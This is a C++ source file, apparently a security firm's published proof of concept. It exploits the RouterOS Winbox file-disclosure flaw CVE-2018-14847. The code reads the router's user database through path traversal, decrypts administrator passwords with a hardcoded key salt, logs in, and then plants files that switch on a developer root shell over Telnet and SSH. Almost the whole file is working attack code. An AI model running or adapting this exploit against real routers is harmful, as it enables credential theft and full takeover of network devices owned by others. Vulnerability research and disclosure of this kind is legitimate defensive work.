/*
    Copyright 2018-2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#include <sstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"
#include "md5.hpp"

namespace
{
    const char s_version[] = "By the Way 1.1.0";

    /*!
     * Parses the command line arguments. The program will always use two
     * parameters (ip and winbox port) but the port will default to 8291 if
     * not present on the CLI
     *
     * \param[in] p_arg_count the number of arguments on the command line
     * \param[in] p_arg_array the arguments passed on the command line
     * \param[in,out] p_ip the ip address to connect to
     * \param[in,out] p_winbox_port the winbox port to connect to
     * \return true if we have valid ip and ports. false otherwise.
     */
    bool parseCommandLine(int p_arg_count, const char* p_arg_array[],
                          std::string& p_ip, std::string& p_winbox_port)
    {
        boost::program_options::options_description description("options");
        description.add_options()
        ("help,h", "A list of command line options")
        ("version,v", "Display version information")
        ("winbox-port,w", boost::program_options::value<std::string>()->default_value("8291"), "The winbox port")
        ("ip,i", boost::program_options::value<std::string>(), "The ip to connect to");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_arg_count, p_arg_array, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << "\n" << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("ip") && argv_map.count("winbox-port"))
        {
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_winbox_port.assign(argv_map["winbox-port"].as<std::string>());
            return true;
        }
        else
        {
            std::cerr << description << std::endl;
        }

        return false;
    }

    /*!
     * This function uses the file disclosure vulnerability, CVE-2018-14847, to
     * download the user database from /flash/rw/store/user.dat
     *
     * \param[in] p_ip the address of the router to connect to
     * \param[in] p_winbox_port the winbox port to connect to
     * \return a string containing the user.dat data or an empty string on error
     */
    std::string getPasswords(const std::string& p_ip, const std::string& p_winbox_port)
    {
        std::cout << "[+] Attempting to connect to " << p_ip << ":" << p_winbox_port << std::endl;
        Winbox_Session winboxSession(p_ip, p_winbox_port);
        if (!winboxSession.connect())
        {
            std::cerr << "[!] Failed to connect to the remote host" << std::endl;
            return std::string();
        }

        std::cout << "[+] Extracting user.dat..." << std::endl;

        WinboxMessage msg;
        msg.set_to(2, 2);
        msg.set_command(7);
        msg.set_request_id(1);
        msg.set_reply_expected(true);
        msg.add_string(1, "//./.././.././../flash/rw/store/user.dat");
        winboxSession.send(msg);

        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "[!] Error receiving an open file response." << std::endl;
            return std::string();
        }

        boost::uint32_t sessionID = msg.get_session_id();
        boost::uint16_t file_size = msg.get_u32(2);
        if (file_size == 0)
        {
            std::cerr << "[!] File size is 0" << std::endl;
            return std::string();
        }

        msg.reset();
        msg.set_to(2, 2);
        msg.set_command(4);
        msg.set_request_id(2);
        msg.set_reply_expected(true);
        msg.set_session_id(sessionID);
        msg.add_u32(2, file_size);
        winboxSession.send(msg);

        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "[!] Error receiving a file content response." << std::endl;
            return std::string();
        }

        return msg.get_raw(0x03);
    }

    /*!
     * Looks through the user.dat file for an enabled administrative account that
     * we can use. Once a useful account is found the password is decrypted.
     *
     * \param[in] p_user_dat the user.dat file data
     * \param[in,out] p_username stores the found admin username
     * \param[in,out] p_password stores the found admin password
     * \return true on success and false otherwrise
     */
    bool get_password(const std::string p_user_dat, std::string& p_username, std::string& p_password)
    {
        std::cout << "[+] Searching for administrator credentials " << std::endl;

        // the dat file is a series of nv::messages preceded by a two byte length
        std::string dat(p_user_dat);
        while (dat.size() > 4)
        {
            boost::uint16_t length = *reinterpret_cast<const boost::uint16_t*>(&dat[0]);
            if (dat[2] != 'M' || dat[3] != '2')
            {
                // this is mild insanity but the .dat file messages don't line
                // up properly if a new user is added or whatever.
                dat.erase(0, 1);
                continue;
            }
            dat.erase(0, 4);
            length -= 4;

            if (length > dat.size())
            {
                return false;
            }

            std::string entry(dat.data(), length);
            dat.erase(0, length);

            WinboxMessage msg;
            msg.parse_binary(entry);

            // we need an active admin account
            // 0x2 has three groups: 1 (read), 2 (write), 3 (full)
            if (msg.get_u32(2) == 3 && msg.get_boolean(0xfe000a) == false)
            {
                p_username.assign(msg.get_string(1));

                std::string encrypted_pass(msg.get_string(0x11));
                if (!encrypted_pass.empty() && msg.get_u32(0x1f) != 0)
                {
                    std::string hash_this(p_username);
                    hash_this.append("283i4jfkai3389");

                    MD5 md5;
                    md5.update(hash_this.c_str(), hash_this.size());
                    md5.finalize();
                    std::string md5_hash(md5.getDigest());

                    for (std::size_t i = 0; i < encrypted_pass.size(); i++)
                    {
                        boost::uint8_t decrypted = encrypted_pass[i] ^ md5_hash[i % md5_hash.size()];
                        if (decrypted == 0)
                        {
                            // a null terminator! We did it.
                            return true;
                        }
                        p_password.push_back(decrypted);
                    }

                    // not everything is null terminated. Kind of annoying. Let's
                    // loop over the result and see if everything is ascii. If
                    // so we can roll with that.
                    bool good = true;
                    for (std::size_t i = 0; i < p_password.size() && good; i++)
                    {
                        if (((unsigned char)p_password[i]) < 0x20 ||
                            ((unsigned char)p_password[i]) > 0x7f)
                        {
                            good = false;
                        }
                    }

                    if (good)
                    {
                        return true;
                    }
                    p_password.clear();
                }
            }
        }
        return false;
    }
}

/*!
 * This function creates the file /pckg/option on the target. This will enable
 * the developer login on Telnet and SSH. Oddly, you'll first need to log in
 * to Telnet for SSH to work, but I digress...
 *
 * \param[in] p_ip the ip address of the router
 * \param[in] p_port the port of the jsproxy we'll connect to
 * \param[in] p_username the username we'll authenticate with
 * \param[in] p_password the password we'll authenticate with
 * \return true if we successfully created the file.
 */
bool create_file(const std::string& p_ip, const std::string& p_port,
                 const std::string& p_username, const std::string& p_password)
{
    Winbox_Session mproxy_session(p_ip, p_port);
    if (!mproxy_session.connect())
    {
        std::cerr << "[-] Failed to connect to the remote host" << std::endl;
        return false;
    }

    boost::uint32_t p_session_id = 0;
    if (!mproxy_session.login(p_username, p_password, p_session_id))
    {
        std::cerr << "[-] Login failed." << std::endl;
        return false;
    }

    std::cout << "[+] Creating /pckg/option on " << p_ip << ":" << p_port << std::endl;

    WinboxMessage msg;
    msg.set_to(2, 2);
    msg.set_command(1);
    msg.set_request_id(1);
    msg.set_reply_expected(true);
    msg.set_session_id(p_session_id);
    msg.add_string(1, "//./.././.././../pckg/option");
    mproxy_session.send(msg);

    msg.reset();
    mproxy_session.receive(msg);
    if (msg.has_error())
    {
        std::cout << "[-] " << msg.get_error_string() << std::endl;
        return false;
    }

    std::cout << "[+] Creating /flash/nova/etc/devel-login on " << p_ip << ":" << p_port << std::endl;
    msg.reset();
    msg.set_to(2, 2);
    msg.set_command(1);
    msg.set_request_id(2);
    msg.set_reply_expected(true);
    msg.set_session_id(p_session_id);
    msg.add_string(1, "//./.././.././../flash/nova/etc/devel-login");
    mproxy_session.send(msg);

    msg.reset();
    mproxy_session.receive(msg);
    if (msg.has_error())
    {
        std::cout << "[-] " << msg.get_error_string() << std::endl;
        return false;
    }

    return true;
}

int main(int p_argc, const char** p_argv)
{
    std::string ip;
    std::string winbox_port;
    if (!parseCommandLine(p_argc, p_argv, ip, winbox_port))
    {
        return EXIT_FAILURE;
    }

    std::cout << std::endl;
    std::cout << "   ╔╗ ┬ ┬  ┌┬┐┬ ┬┌─┐  ╦ ╦┌─┐┬ ┬" << std::endl;
    std::cout << "   ╠╩╗└┬┘   │ ├─┤├┤   ║║║├─┤└┬┘" << std::endl;
    std::cout << "   ╚═╝ ┴    ┴ ┴ ┴└─┘  ╚╩╝┴ ┴ ┴ " << std::endl;
    std::cout << std::endl;

    // step one - do the file disclosure
    std::string user_dat(getPasswords(ip, winbox_port));
    if (user_dat.empty())
    {
        return EXIT_FAILURE;
    }

    // step two - parse the password
    std::string admin_username;
    std::string admin_password;
    if (!get_password(user_dat, admin_username, admin_password))
    {
        std::cout << "[-] Failed to find admin creds. Trying default." << std::endl;
        admin_username.assign("admin");
        admin_password.assign("");
    }

    std::cout << "[+] Using credentials - " << admin_username << ":" << admin_password << std::endl;

    // step three - create the file
    if (!create_file(ip, winbox_port, admin_username, admin_password))
    {
        return EXIT_FAILURE;
    }

    std::cout << "[+] There's a light on" << std::endl;
    return EXIT_SUCCESS;
}
 
